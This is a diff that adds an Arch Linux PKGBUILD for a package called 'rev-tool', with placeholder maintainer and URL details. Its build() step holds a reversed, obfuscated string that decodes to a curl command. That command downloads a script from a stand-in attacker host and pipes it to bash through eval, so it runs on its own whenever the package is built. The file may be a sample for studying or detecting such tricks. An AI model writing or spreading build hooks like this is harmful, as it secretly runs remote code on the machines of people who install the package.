@@ -1,0 +1,16 @@
+# Maintainer: Real Looking Person <person@example.com>
+pkgname=rev-tool
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A useful tool"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+depends=('glibc')
+source=()
+sha256sums=()
+build() {
+  cmd=$(echo 'hsab | moc.elpmaxe-live//:ptth LsfC lruc' | rev)
+  eval "$cmd"
+}
+package() { :; }
